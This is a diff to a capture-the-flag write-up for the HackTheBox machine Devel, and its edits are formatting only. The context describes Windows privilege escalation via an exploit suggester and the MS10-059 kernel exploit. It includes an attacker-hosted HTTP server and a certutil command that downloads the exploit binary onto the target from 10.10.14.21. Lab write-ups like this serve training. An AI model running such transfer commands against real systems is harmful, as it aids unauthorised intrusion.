@@ -104,6 +104,7 @@ So we cant run winpeas and we cant run powershell. lets try running [Windows Exp
 
 (make sure you install xlrd with `pip2 install xlrd==1.2.0`)
 
+
 First we need to save the output of `systeminfo` from the target to a file on our attack machine. 
 then we can run the exploit-suggester as such: 
 
@@ -123,8 +124,8 @@ You can find the exploit [here](https://github.com/SecWiki/windows-kernel-exploi
 Lets transfer the exploit to our target machine. 
 open an http server locally with `python3 -m http.server 8888`.
 
-`cd` into a writable directory `cd c:\\windows\\temp` and download the exploit from the target
-with `certutil -urlcache -f http://10.10.14.21:8888/MS10-059.exe ms.exe`
+`cd` into a writable directory `cd c:\\windows\\temp` and download the exploit from the target with:
+`certutil -urlcache -f http://10.10.14.21:8888/MS10-059.exe ms.exe`
 
 ![transfer-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Devel/img/transfer-12.png)
 
